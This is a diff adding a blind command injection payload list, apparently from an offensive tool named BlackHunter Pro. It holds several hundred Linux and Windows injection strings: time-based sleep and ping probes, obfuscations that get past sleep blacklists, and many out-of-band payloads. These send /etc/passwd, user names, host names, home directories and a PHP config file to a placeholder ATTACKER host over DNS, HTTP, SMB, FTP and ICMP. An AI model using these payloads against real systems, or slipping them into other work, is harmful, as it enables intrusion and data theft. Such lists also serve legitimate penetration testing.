@@ -1,0 +1,454 @@
+# payloads/cmdi/blind.txt
+# Blind Command Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# TIME-BASED - LINUX
+# =============================================
+
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; sleep 5 #
+; sleep 5 //
+; sleep${IFS}5
+; sleep$IFS5
+; sleep${IFS}5&&
+; sleep 5 &
+; sleep 5 |
+; sleep 5 ||
+; sleep 5 &&
+; /bin/sleep 5
+; /usr/bin/sleep 5
+; sleep 5; sleep 5
+; sleep 5 && sleep 5
+; sleep 5 || sleep 5
+; sleep 5 | sleep 5
+; timeout 5
+; timeout 5 sleep 10
+; ping -c 5 127.0.0.1
+; ping -c 5 localhost
+; ping -c 5 0.0.0.0
+; ping -c 5 $(hostname)
+; ping -n 5 127.0.0.1
+; perl -e 'sleep 5'
+; perl -e 'select(undef,undef,undef,5)'
+; python -c 'import time; time.sleep(5)'
+; python3 -c 'import time; time.sleep(5)'
+; php -r 'sleep(5);'
+; ruby -e 'sleep 5'
+; node -e 'setTimeout(function(){},5000)'
+; awk 'BEGIN {system("sleep 5")}'
+; bash -c 'sleep 5'
+; sh -c 'sleep 5'
+; nc -w 5 127.0.0.1 1
+; telnet 127.0.0.1 1
+; curl -m 5 http://127.0.0.1/
+; wget -T 5 http://127.0.0.1/
+
+# =============================================
+# TIME-BASED - WINDOWS
+# =============================================
+
+& timeout /t 5
+| timeout /t 5
+|| timeout /t 5
+&& timeout /t 5
+& timeout /t 5 /nobreak
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+|| ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+& ping -n 5 localhost
+& ping -n 5 0.0.0.0
+& powershell -c "Start-Sleep -s 5"
+& powershell -c "Start-Sleep -Seconds 5"
+& powershell -c "Sleep 5"
+& powershell -Command "Start-Sleep -s 5"
+& powershell -Command "Start-Sleep -Seconds 5"
+& cmd /c "timeout /t 5"
+& cmd.exe /c "timeout /t 5"
+& Start-Sleep -s 5
+& Start-Sleep -Seconds 5
+& sleep 5
+& waitfor delay 5
+& choice /t 5 /d y
+
+# =============================================
+# DNS EXFILTRATION - LINUX
+# =============================================
+
+; nslookup ATTACKER
+; nslookup test.ATTACKER
+; nslookup $(whoami).ATTACKER
+; nslookup `whoami`.ATTACKER
+; nslookup $(hostname).ATTACKER
+; nslookup $(pwd).ATTACKER
+; nslookup $(id | base64).ATTACKER
+; nslookup $(cat /etc/passwd | base64 | head -1).ATTACKER
+; dig ATTACKER
+; dig test.ATTACKER
+; dig $(whoami).ATTACKER
+; host ATTACKER
+; host test.ATTACKER
+; host $(whoami).ATTACKER
+; ping -c 1 ATTACKER
+; ping -c 1 $(whoami).ATTACKER
+; ping -c 1 test.ATTACKER
+; curl http://ATTACKER/
+; curl http://$(whoami).ATTACKER/
+; curl http://test.ATTACKER/
+; wget http://ATTACKER/
+; wget http://$(whoami).ATTACKER/
+
+# =============================================
+# DNS EXFILTRATION - WINDOWS
+# =============================================
+
+& nslookup ATTACKER
+& nslookup test.ATTACKER
+& nslookup %USERNAME%.ATTACKER
+& nslookup %COMPUTERNAME%.ATTACKER
+& nslookup %USERDOMAIN%.ATTACKER
+& ping -n 1 ATTACKER
+& ping -n 1 %USERNAME%.ATTACKER
+& ping -n 1 test.ATTACKER
+& powershell -c "Resolve-DnsName ATTACKER"
+& powershell -c "Resolve-DnsName test.ATTACKER"
+& powershell -c "Resolve-DnsName $env:USERNAME.ATTACKER"
+& powershell -c "Resolve-DnsName $env:COMPUTERNAME.ATTACKER"
+& certutil -urlcache -f http://ATTACKER/test
+& curl http://ATTACKER/
+& curl http://%USERNAME%.ATTACKER/
+& bitsadmin /transfer job http://ATTACKER/test
+
+# =============================================
+# HTTP CALLBACK - LINUX
+# =============================================
+
+; curl http://ATTACKER/
+; curl http://ATTACKER/$(whoami)
+; curl http://ATTACKER/$(hostname)
+; curl http://ATTACKER/$(id)
+; curl http://ATTACKER/$(cat /etc/passwd | base64)
+; curl -s http://ATTACKER/
+; curl -d @/etc/passwd http://ATTACKER/
+; curl -F "file=@/etc/passwd" http://ATTACKER/
+; wget http://ATTACKER/
+; wget -qO- http://ATTACKER/
+; wget --post-file=/etc/passwd http://ATTACKER/
+; nc ATTACKER 80
+; nc ATTACKER 80 < /etc/passwd
+; cat /etc/passwd | nc ATTACKER 80
+
+# =============================================
+# HTTP CALLBACK - WINDOWS
+# =============================================
+
+& certutil -urlcache -f http://ATTACKER/ test
+& certutil -urlcache -split -f http://ATTACKER/ test
+& bitsadmin /transfer job http://ATTACKER/
+& powershell -c "IWR http://ATTACKER/"
+& powershell -c "IWR http://ATTACKER/$env:USERNAME"
+& powershell -c "IWR http://ATTACKER/$env:COMPUTERNAME"
+& powershell -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER/')"
+& powershell -c "(New-Object Net.WebClient).UploadString('http://ATTACKER/', 'data')"
+& powershell -c "(New-Object Net.WebClient).UploadFile('http://ATTACKER/', 'C:\Windows\win.ini')"
+& curl http://ATTACKER/
+& curl http://%USERNAME%.ATTACKER/
+& curl -F "file=@C:\Windows\win.ini" http://ATTACKER/
+
+# =============================================
+# SMB CALLBACK - WINDOWS
+# =============================================
+
+& dir \\ATTACKER\share
+& dir \\ATTACKER\share\test
+& copy \\ATTACKER\share\test.txt C:\Temp\
+& type \\ATTACKER\share\test.txt
+& net use \\ATTACKER\share
+& net use Z: \\ATTACKER\share
+& net view \\ATTACKER
+& nslookup ATTACKER
+& ping -n 1 ATTACKER
+
+# =============================================
+# FTP CALLBACK - LINUX
+# =============================================
+
+; ftp ATTACKER
+; ftp -n ATTACKER
+; curl ftp://ATTACKER/
+; wget ftp://ATTACKER/
+; nc ATTACKER 21
+
+# =============================================
+# ICMP EXFILTRATION - LINUX
+# =============================================
+
+; ping -c 1 -p 4141414141414141 ATTACKER
+; ping -c 1 -p $(whoami | xxd -p) ATTACKER
+; ping -c 5 ATTACKER
+; hping3 -c 1 -d 100 -E /etc/passwd ATTACKER
+
+# =============================================
+# ICMP EXFILTRATION - WINDOWS
+# =============================================
+
+& ping -n 1 -l 1000 ATTACKER
+& ping -n 1 ATTACKER
+& ping -n 5 ATTACKER
+
+# =============================================
+# TIME-BASED - ADVANCED
+# =============================================
+
+# Heavy computation (CPU delay)
+; yes > /dev/null &
+; dd if=/dev/zero of=/dev/null count=100000000
+; cat /dev/zero > /dev/null
+; md5sum /dev/zero
+; openssl speed md5
+
+# Network delay
+; nc -w 10 ATTACKER 80
+; curl -m 10 http://ATTACKER/
+; wget -T 10 http://ATTACKER/
+; ssh -o ConnectTimeout=10 user@ATTACKER
+
+# Nested delays
+; sleep 2 && sleep 3
+; sleep 2 || sleep 3
+; sleep 2; sleep 3
+; (sleep 5)
+; { sleep 5; }
+; if true; then sleep 5; fi
+
+# =============================================
+# OOB (OUT-OF-BAND) - FULL PAYLOADS
+# =============================================
+
+; nslookup ATTACKER; sleep 5
+; ping -c 5 ATTACKER; sleep 5
+; curl http://ATTACKER/$(whoami); sleep 5
+; wget http://ATTACKER/$(hostname); sleep 5
+; nslookup $(cat /etc/passwd | base64 | head -1).ATTACKER
+; nslookup $(ls /root | base64).ATTACKER
+; nslookup $(cat /var/www/html/config.php | base64 | head -1).ATTACKER
+
+& nslookup %USERNAME%.ATTACKER; timeout /t 5
+& ping -n 5 ATTACKER; timeout /t 5
+& powershell -c "IWR http://ATTACKER/$env:USERNAME"; timeout /t 5
+& certutil -urlcache -f http://ATTACKER/%USERNAME%; timeout /t 5
+& nslookup %USERNAME%.ATTACKER; nslookup %COMPUTERNAME%.ATTACKER
+
+# =============================================
+# ENCODED BLIND PAYLOADS
+# =============================================
+
+;%20sleep%205
+%3B%20sleep%205
+%3B+sleep+5
+%3Bsleep%205
+;%09sleep%095
+;%0Asleep%0A5
+%0Asleep%205
+%0D%0Asleep%205
+
+&%20timeout%20/t%205
+%26%20timeout%20/t%205
+%26+timeout+/t+5
+%26timeout%20/t%205
+%26%09timeout%09/t%095
+%0D%0Atimeout%20/t%205
+
+# =============================================
+# SLEEP VARIATIONS
+# =============================================
+
+; sleep 5
+; sleep 5s
+; sleep 5m
+; sleep 0.5
+; sleep 1 && sleep 4
+; sleep 5 &
+; (sleep 5)
+; {sleep 5;}
+; nohup sleep 5 &
+; timeout 5 sleep 10
+; env sleep 5
+; /bin/sleep 5
+; /usr/bin/sleep 5
+; $(which sleep) 5
+; `which sleep` 5
+
+# =============================================
+# BYPASS SLEEP BLACKLIST
+# =============================================
+
+; /bin/sl''eep 5
+; /bin/sl"e"ep 5
+; /bin/sle\ep 5
+; /bin/slee\p 5
+; /???/sleep 5
+; /b?n/sleep 5
+; /bin/sl*p 5
+; /bin/[s]leep 5
+; s[l]eep 5
+; s''leep 5
+; s"l"eep 5
+; $'s'l'e'e'p' 5
+; s$@leep 5
+; s${x}leep 5
+; $(echo sleep) 5
+; `echo sleep` 5
+
+# =============================================
+# PING VARIATIONS
+# =============================================
+
+; ping -c 5 127.0.0.1
+; ping -c 5 localhost
+; ping -c 5 0.0.0.0
+; ping -c 5 127.1
+; ping -c 5 127.0.1
+; ping -c 5 $(hostname)
+; ping -c 5 $(hostname -i)
+; ping -c 5 `hostname`
+; ping -n 5 127.0.0.1
+; ping -n 5 localhost
+; ping -n 5 0.0.0.0
+; ping -w 5 127.0.0.1
+; ping -W 5 127.0.0.1
+
+# =============================================
+# CURL VARIATIONS
+# =============================================
+
+; curl -m 5 http://127.0.0.1/
+; curl -m 5 http://ATTACKER/
+; curl --max-time 5 http://ATTACKER/
+; curl -s -m 5 http://ATTACKER/
+; curl -o /dev/null -s -m 5 http://ATTACKER/
+; curl -d "data" http://ATTACKER/
+; curl -X POST -d @/etc/passwd http://ATTACKER/
+; curl -F "file=@/etc/passwd" http://ATTACKER/
+; curl -T /etc/passwd http://ATTACKER/
+; curl -u user:pass http://ATTACKER/
+; curl -H "User-Agent: $(whoami)" http://ATTACKER/
+; curl -A "$(whoami)" http://ATTACKER/
+; curl --data "$(cat /etc/passwd)" http://ATTACKER/
+; curl --data-binary @/etc/passwd http://ATTACKER/
+
+# =============================================
+# WGET VARIATIONS
+# =============================================
+
+; wget -T 5 http://ATTACKER/
+; wget --timeout=5 http://ATTACKER/
+; wget -qO- http://ATTACKER/
+; wget -qO- http://ATTACKER/$(whoami)
+; wget -qO- http://ATTACKER/$(hostname)
+; wget --post-data="$(cat /etc/passwd)" http://ATTACKER/
+; wget --post-file=/etc/passwd http://ATTACKER/
+; wget -O /tmp/out http://ATTACKER/
+; wget -q http://ATTACKER/ -O /tmp/out
+
+# =============================================
+# DNS LOOKUP VARIATIONS
+# =============================================
+
+; nslookup ATTACKER
+; nslookup test.ATTACKER
+; nslookup $(whoami).ATTACKER
+; nslookup `whoami`.ATTACKER
+; nslookup $(hostname).ATTACKER
+; nslookup $(id -u).ATTACKER
+; nslookup $(id -un).ATTACKER
+; nslookup $(uname -n).ATTACKER
+; dig ATTACKER
+; dig +short ATTACKER
+; dig test.ATTACKER
+; host ATTACKER
+; host test.ATTACKER
+; getent hosts ATTACKER
+; getent hosts $(whoami).ATTACKER
+
+# =============================================
+# MULTIPLE CALLBACKS
+# =============================================
+
+; nslookup $(whoami).ATTACKER && nslookup $(hostname).ATTACKER && nslookup $(pwd).ATTACKER
+; nslookup $(whoami).ATTACKER; nslookup $(hostname).ATTACKER; nslookup $(id).ATTACKER
+; for i in $(cat /etc/passwd | cut -d: -f1); do nslookup $i.ATTACKER; done
+; for i in $(ls /home); do nslookup $i.ATTACKER; done
+
+# =============================================
+# HTTP STATUS-BASED DETECTION
+# =============================================
+
+# These payloads cause HTTP status differences
+
+; curl -s -o /dev/null -w "%{http_code}" http://ATTACKER/200
+; curl -s -o /dev/null -w "%{http_code}" http://ATTACKER/500
+; wget -q --spider http://ATTACKER/200
+; wget -q --spider http://ATTACKER/500
+
+# =============================================
+# CONDITIONAL DELAYS
+# =============================================
+
+; [ $(id -u) -eq 0 ] && sleep 5
+; [ $(whoami) = "root" ] && sleep 5
+; [ -f /etc/passwd ] && sleep 5
+; [ -r /etc/shadow ] && sleep 5
+; if [ $(id -u) -eq 0 ]; then sleep 5; fi
+; test $(id -u) -eq 0 && sleep 5
+; test -r /etc/shadow && sleep 5
+; [[ $(whoami) == "root" ]] && sleep 5
+
+# =============================================
+# ENCODED/BYPASSED COMMANDS
+# =============================================
+
+; $(printf '\163\154\145\145\160\040\065')       # sleep 5 (octal)
+; $(printf '\x73\x6c\x65\x65\x70\x20\x35')       # sleep 5 (hex)
+; $(echo c2xlZXAgNQ== | base64 -d)                # sleep 5 (base64)
+; $(echo sleep | rev | rev) 5                     # reverse
+; `echo sleep` 5                                  # command substitution
+; s'l'e'e'p 5
+; s"l"e"e"p 5
+; s\l\e\e\p 5
+; sl''eep 5
+; sle''ep 5
+; slee''p 5
+; $'s\x6c\x65\x65\x70' 5
+
+# =============================================
+# FULL BLIND PAYLOAD EXAMPLES
+# =============================================
+
+# Example 1: Simple time-based test
+; sleep 5
+
+# Example 2: DNS exfiltration with time confirmation
+; nslookup $(whoami).ATTACKER; sleep 5
+
+# Example 3: HTTP callback with data
+; curl http://ATTACKER/$(whoami)/$(hostname); sleep 3
+
+# Example 4: Windows time-based
+& timeout /t 5
+
+# Example 5: Windows DNS exfiltration
+& nslookup %USERNAME%.ATTACKER; timeout /t 5
+
+# Example 6: Multiple data points
+; for i in $(cat /etc/passwd | head -5); do nslookup $i.ATTACKER; done
+
+# Example 7: HTTP POST with file content
+; curl -X POST -d @/etc/passwd http://ATTACKER/
